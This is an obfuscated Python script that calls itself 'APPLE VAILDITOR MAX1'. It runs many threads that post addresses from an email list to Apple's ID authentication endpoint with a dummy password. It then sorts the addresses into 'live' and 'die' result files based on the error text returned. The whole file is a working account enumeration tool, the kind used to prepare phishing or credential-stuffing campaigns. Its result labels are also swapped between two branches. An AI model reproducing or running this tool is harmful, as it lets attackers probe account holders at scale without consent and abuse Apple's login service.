import requests #line:1
import re #line:2
import time #line:3
import threading #line:4
import sys #line:5
import queue #line:6
import sys #line:7
import datetime #line:8
class Apple ():#line:10
	ua ='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'#line:12
	live ='Access denied. Your account does not have permission to access this application.'.encode ()#line:13
	die ='Your Apple ID or password was entered incorrectly.'.encode ()#line:14
	version ='APPLE VAILDITOR MAX1 V1'#line:15
	input_queue =queue .Queue ()#line:16
	def __init__ (O00OOOO0OO0O00O0O ):#line:19
		print (r"""





  ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄   ▄             ▄▄▄▄▄▄▄▄▄▄▄
 ▐░░░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░▌           ▐░░░░░░░░░░░▌
 ▐░█▀▀▀▀▀▀▀█░▌ ▐░█▀▀▀▀▀▀▀█░▌ ▐░█▀▀▀▀▀▀▀█░▌ ▐░▌           ▐░█▀▀▀▀▀▀▀▀▀
 ▐░▌       ▐░▌ ▐░▌       ▐░▌ ▐░▌       ▐░▌ ▐░▌           ▐░▌
 ▐░█▄▄▄▄▄▄▄█░▌ ▐░█▄▄▄▄▄▄▄█░▌ ▐░█▄▄▄▄▄▄▄█░▌ ▐░▌           ▐░█▄▄▄▄▄▄▄▄▄
 ▐░░░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░▌           ▐░░░░░░░░░░░▌
 ▐░█▀▀▀▀▀▀▀█░▌ ▐░█▀▀▀▀▀▀▀▀▀  ▐░█▀▀▀▀▀▀▀▀▀  ▐░▌           ▐░█▀▀▀▀▀▀▀▀▀
 ▐░▌       ▐░▌ ▐░▌           ▐░▌           ▐░▌           ▐░▌
 ▐░▌       ▐░▌ ▐░▌           ▐░▌           ▐░█▄▄▄▄▄▄▄▄▄  ▐░█▄▄▄▄▄▄▄▄▄
 ▐░▌       ▐░▌ ▐░▌           ▐░▌           ▐░░░░░░░░░░░▌ ▐░░░░░░░░░░░▌
  ▀         ▀   ▀             ▀             ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀





                            
		""")#line:41
		O00OOOO0OO0O00O0O .mailist =input (" -> Enter Mailist : ")#line:43
		O00OOOO0OO0O00O0O .thread =input (" -> Thread : ")#line:44
		O00OOOO0OO0O00O0O .count_list =len (list (open (O00OOOO0OO0O00O0O .mailist )))#line:45
		O00OOOO0OO0O00O0O .clean =input (" -> Clean rezult folder ? (y/n) ")#line:46
		if O00OOOO0OO0O00O0O .clean =='y':O00OOOO0OO0O00O0O .clean_rezult ()#line:47
		print ('')#line:48
	def save_to_file (O0O000000OOO0000O ,OOO0O00O00000OO0O ,OO00OOOO0OO00O0O0 ):#line:50
		O0O000OO0O00O0000 =open (OOO0O00O00000OO0O ,'a+')#line:51
		O0O000OO0O00O0000 .write (OO00OOOO0OO00O0O0 )#line:52
		O0O000OO0O00O0000 .close ()#line:53
	def clean_rezult (O0O0OO0O00O0O0O00 ):#line:55
		open ('rezult/live.txt','w').close ()#line:56
		open ('rezult/die.txt','w').close ()#line:57
		open ('rezult/unknown.txt','w').close ()#line:58
	def post_email (OOOO00OO0000OOO00 ,O0OOO0OO0000O00OO ):#line:60
		OO0O0O0O0O00OO000 =requests .post ('https://idmsac.apple.com/IDMSWebAuth/authenticate',data ={'accountPassword':'xxxxxxx','appleId':O0OOO0OO0000O00OO ,'appIdKey':'f52543bf72b66552b41677a95aa808462c95ebaaaf19323ddb3be843e5100cb8'},headers ={'User-Agent':OOOO00OO0000OOO00 .ua })#line:69
		if OOOO00OO0000OOO00 .live in OO0O0O0O0O00OO000 .content :return 'live'#line:70
		elif OOOO00OO0000OOO00 .die in OO0O0O0O0O00OO000 .content :return 'die'#line:71
		else :return 'unknown'#line:72
	def chk (O0O0O0OO000O00O00 ):#line:74
		while 1 :#line:76
			O00000OOO00000O00 =O0O0O0OO000O00O00 .input_queue .get ()#line:78
			O00OOO0000OOOOO0O =O0O0O0OO000O00O00 .post_email (O00000OOO00000O00 )#line:79
			if O00OOO0000OOOOO0O =='live':#line:81
				print (' ->',O0O0O0OO000O00O00 .version ,'-',datetime .datetime .now ().strftime ('%Y-%m-%d %H:%M:%S'),'- LIVE - '+O00000OOO00000O00 )#line:82
				O0O0O0OO000O00O00 .save_to_file ('rezult/live.txt',O00000OOO00000O00 +'\n')#line:83
			elif O00OOO0000OOOOO0O =='die':#line:84
				print (' ->',O0O0O0OO000O00O00 .version ,'-',datetime .datetime .now ().strftime ('%Y-%m-%d %H:%M:%S'),'- UNKN - '+O00000OOO00000O00 )#line:85
				O0O0O0OO000O00O00 .save_to_file ('rezult/unknown.txt',O00000OOO00000O00 +'\n')#line:86
			elif O00OOO0000OOOOO0O =='unknown':#line:87
				print (' ->',O0O0O0OO000O00O00 .version ,'-',datetime .datetime .now ().strftime ('%Y-%m-%d %H:%M:%S'),'- DEAD - '+O00000OOO00000O00 )#line:88
				O0O0O0OO000O00O00 .save_to_file ('rezult/die.txt',O00000OOO00000O00 +'\n')#line:89
			O0O0O0OO000O00O00 .input_queue .task_done ()#line:91
	def run_thread (O0O0OO0OO0OO000OO ):#line:93
		O0O0OO0OO0OO000OO .start_time =time .time ()#line:95
		for OO00000OOO0000O00 in range (int (O0O0OO0OO0OO000OO .thread )):#line:97
			OOO0OO00O00OO0OO0 =threading .Thread (target =O0O0OO0OO0OO000OO .chk )#line:98
			OOO0OO00O00OO0OO0 .setDaemon (True )#line:99
			OOO0OO00O00OO0OO0 .start ()#line:100
		for OO0O00O0000OOO0OO in open (O0O0OO0OO0OO000OO .mailist ,'r').readlines ():#line:102
			O0O0OO0OO0OO000OO .input_queue .put (OO0O00O0000OOO0OO .strip ())#line:103
		O0O0OO0OO0OO000OO .input_queue .join ()#line:104
	def finish (O0OO000O0OO0OOO00 ):#line:106
		print ('')#line:107
		print ('-------------------------------------------------')#line:108
		print ('')#line:109
		print ('Checking ',O0OO000O0OO0OOO00 .count_list ,' emails has been completed perfectly')#line:110
		print ('Processing time : ',time .time ()-O0OO000O0OO0OOO00 .start_time ,'seconds')#line:111
		print ('')#line:112
		print ('Live : ',len (list (open ('rezult/live.txt'))),'emails')#line:113
		print ('unknown : ',len (list (open ('rezult/unknown.txt'))),'emails')#line:114
		print ('Die : ',len (list (open ('rezult/die.txt'))),'emails')#line:115
		print ('')#line:116
		print ('Bye :)')#line:117
heh =Apple ()#line:119
heh .run_thread ()#line:120
heh .finish ()#line:121
